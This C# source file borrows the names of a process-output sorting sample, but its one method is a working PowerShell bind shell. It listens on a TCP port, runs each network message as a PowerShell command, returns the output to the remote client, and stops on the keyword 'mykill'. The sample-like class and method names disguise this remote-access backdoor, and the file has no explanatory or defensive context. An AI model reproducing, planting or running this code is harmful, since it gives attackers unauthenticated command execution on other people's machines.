﻿using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace ProcessAsyncStreamSamples
{
    class SortOutputRedirection1
    {
        // Define static variables shared by class methods.
        private static StringBuilder sortOutput = null;
        public static void SortInputListText(string SERVER_IP, int port)
        {
            //---listen at the specified IP and port no.---
            IPAddress localAdd = IPAddress.Parse(SERVER_IP);
            TcpListener listener = new TcpListener(localAdd, port);
            Console.WriteLine("Listening...");
            listener.Start();
            //---incoming client connected---
            TcpClient client = listener.AcceptTcpClient();
            //---get the incoming data through a network stream---
            NetworkStream nwStream = client.GetStream();
            Process sortProcess = new Process();
            sortProcess.StartInfo.FileName = "powershell.exe";
            sortProcess.StartInfo.UseShellExecute = false;
            sortProcess.StartInfo.RedirectStandardOutput = true;
            sortOutput = new StringBuilder();
            sortProcess.OutputDataReceived += SortOutputHandler;
            sortProcess.StartInfo.RedirectStandardInput = true;
            sortProcess.Start();
            StreamWriter sortStreamWriter = sortProcess.StandardInput;
            sortProcess.BeginOutputReadLine();
            String inputText;
            try
            {
                do
                {
                    byte[] bytesToRead = new byte[client.ReceiveBufferSize];
                    int bytesRead = nwStream.Read(bytesToRead, 0, client.ReceiveBufferSize);
                    Console.WriteLine("Received : " + Encoding.ASCII.GetString(bytesToRead, 0, bytesRead));
                    inputText = Encoding.ASCII.GetString(bytesToRead, 0, bytesRead);
                    if (inputText == "mykill")
                    {
                        byte[] outputbuf2 = ASCIIEncoding.ASCII.GetBytes("good bye");
                        nwStream.Write(outputbuf2, 0, outputbuf2.Length);
                        sortStreamWriter.Close();
                        sortProcess.WaitForExit();
                        sortProcess.Close();
                        client.Close();
                        listener.Stop();
                        break;
                    }
                    sortOutput.Clear();
                    if (!String.IsNullOrEmpty(inputText))
                    {
                        sortStreamWriter.WriteLine(inputText);
                        Thread.Sleep(1500);
                        byte[] outputbuf = ASCIIEncoding.ASCII.GetBytes(sortOutput.ToString());
                        nwStream.Write(outputbuf, 0, outputbuf.Length);
                    }

                } while (true);

            }
            catch
            {
                sortStreamWriter.Close();
                sortProcess.WaitForExit();
                sortProcess.Close();
                client.Close();
                listener.Stop();
            }

        }
        private static void SortOutputHandler(object sendingProcess,
            DataReceivedEventArgs outLine)
        {
            // Collect the sort command output.
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                sortOutput.Append(Environment.NewLine +
                    $" {outLine.Data}");
            }
        }
    }
}